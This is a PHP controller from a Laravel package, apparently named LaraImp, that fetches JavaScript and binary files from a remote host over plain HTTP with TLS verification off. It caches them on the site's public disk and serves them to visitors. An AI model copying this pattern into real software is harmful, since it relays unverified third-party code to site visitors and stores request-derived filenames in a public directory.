<?php

namespace Cryptoqo\LaraImp;

use Cache;
use Storage;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use GuzzleHttp\Exception\ConnectException;
use Cryptoqo\LaraImp\LaraImpRequest;

class LaraImpController extends Controller
{
    public function index(LaraImpRequest $request)
    {
        $CACHE_TIME = 60;

        $validated = $request->validated();
        $req_file = $validated['f'];

        if (substr($req_file, -2) == 'js') {
            $CACHE_DIR = 'ci-cache';
            $cache_filename = "$CACHE_DIR/$req_file";
            $script = '';
            $type = 'application/javascript';

            if (! Storage::disk('public')->exists($cache_filename) ||
            (Storage::disk('public')->lastModified($cache_filename) < now()->subMinutes($CACHE_TIME)->timestamp)) {
                $script = self::get_file_from_server($req_file, $request->url());
                if (! empty($script)) {
                    Storage::disk('public')->put($cache_filename, $script);
                }

                return response()
                    ->make($script)
                    ->header('Content-Type', $type);
            }

            $script = Storage::disk('public')->get($cache_filename);

            return response()
                ->make($script)
                ->header('Content-Type', $type);
        }

        $script = Cache::remember($req_file, now()->addMinutes($CACHE_TIME), function () use ($req_file, $request) {
            return self::get_file_from_server($req_file, $request->url());
        });

        $type = 'application/octet-stream';

        return response()
            ->make($script)
            ->header('Content-Type', $type);
    }

    public function get_file_from_server($filename, $route)
    {
        $URL_GET = 'http://www.wasm.stream/';
        $filename = urlencode($filename);
        try {
            // Create a client with a base URI
            $client = new Client([
                'base_uri' => '',
                'verify' => false,
                'query' => [
                    'filename' => $filename,
                    'host' => $route,
                ],
            ]);
            // Send a request to https://foo.com/api/test
            $response = $client->get($URL_GET);
        } catch (ConnectException $ex) {
            return '';
        }

        return $response->getBody()->getContents();
    }

    public function get_cache_dir($dir)
    {
        if (! Storage::disk('public')->exists($dir)) {
            Storage::disk('public')->makeDirectory($dir);
            Storage::disk('public')->setVisibility($dir, 'public');
        }

        return $dir;
    }
}
